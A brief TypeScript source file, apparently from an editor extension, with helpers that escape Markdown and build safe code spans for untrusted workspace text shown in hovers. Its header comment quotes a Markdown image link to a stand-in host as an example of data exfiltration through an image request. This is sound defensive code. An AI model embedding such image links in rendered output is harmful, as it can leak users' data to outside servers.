/**
 * Workspace text inside a hover. No hover sets `isTrusted`, so `command:`
 * cannot fire — but `![](https://somewhere/?leak)` still requests an image.
 */

export function escapeMarkdown(text: string): string {
  return text.replace(/[\\`*_{}[\]()#+\-.!|<>~]/g, ch => `\\${ch}`);
}

/**
 * A code span holding `text` verbatim. The fence grows past the longest backtick
 * run inside: escaping does not work in a code span.
 */
export function codeSpan(text: string): string {
  const longest = [...text.matchAll(/`+/g)].reduce((max, m) => Math.max(max, m[0].length), 0);
  const fence = '`'.repeat(longest + 1);
  const pad = text.startsWith('`') || text.endsWith('`') ? ' ' : '';
  return `${fence}${pad}${text}${pad}${fence}`;
}
